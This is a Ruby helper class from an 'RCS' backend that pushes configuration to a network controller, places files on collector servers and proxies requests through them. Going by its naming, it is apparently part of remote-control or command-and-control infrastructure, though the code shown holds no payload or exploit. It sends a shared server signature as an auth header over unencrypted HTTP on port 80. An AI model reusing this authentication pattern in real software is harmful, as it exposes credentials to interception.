#
# Helper class to send push notification to the network controller
#

require 'net/http'
require 'rcs-common/trace'

module RCS
module DB

class Frontend
  extend RCS::Tracer

  def self.nc_push(address)
    begin
      # find a network controller in the status list
      nc = ::Status.where({type: 'nc'}).any_in(status: [::Status::OK, ::Status::WARN]).first

      return false if nc.nil?

      trace :info, "Frontend: Pushing configuration to #{address}"

      headers = {}
      sig = ::Signature.where({scope: 'server'}).first
      headers['X-Auth-Frontend'] = sig[:value]

      # send the push request
      http = Net::HTTP.new(nc.address, 80)
      resp = http.request_put("/RCS-NC_#{address}", '', headers)

      return false unless resp.body == "OK"
      
    rescue Exception => e
      trace :error, "Frontend NC PUSH: #{e.message}"
      return false
    end

    return true
  end

  def self.collector_put(filename, content)
    begin
      raise "no collector found" if ::Status.where({type: 'collector'}).any_in(status: [::Status::OK, ::Status::WARN]).count == 0
      # put the file on every collector, we cannot know where it will be requested
      ::Status.where({type: 'collector'}).any_in(status: [::Status::OK, ::Status::WARN]).each do |collector|

        next if collector.address.nil?
        
        trace :info, "Frontend: Putting #{filename} to #{collector.name} (#{collector.address})"

        headers = {}
        sig = ::Signature.where({scope: 'server'}).first
        headers['X-Auth-Frontend'] = sig[:value]

        # send the push request
        http = Net::HTTP.new(collector.address, 80)
        resp = http.request_put("/#{filename}", content, headers)

        raise "wrong response from collector" unless resp.body == "OK"
      end
    rescue Exception => e
      trace :error, "Frontend Collector PUT: #{e.message}"
      raise "Cannot put file on collector"
    end
  end


  def self.proxy(method, host, url, content = nil, headers = {})
    begin
      raise "no collector found" if ::Status.where({type: 'collector'}).any_in(status: [::Status::OK, ::Status::WARN]).count == 0
      # request to one of the collectors
      collector = ::Status.where({type: 'collector'}).any_in(status: [::Status::OK, ::Status::WARN]).sample

      trace :debug, "Frontend: Proxying #{host} #{url} to #{collector.name}"

      sig = ::Signature.where({scope: 'server'}).first
      headers['X-Auth-Frontend'] = sig[:value]

      # send the push request
      http = Net::HTTP.new(collector.address, 80)
      http.send_request('HEAD', "/#{method}/#{host}#{url}", content, headers)

    rescue Exception => e
      trace :error, "Frontend Collector PROXY: #{e.message}"
      raise "Cannot proxy the request"
    end
  end

end

end #DB::
end #RCS::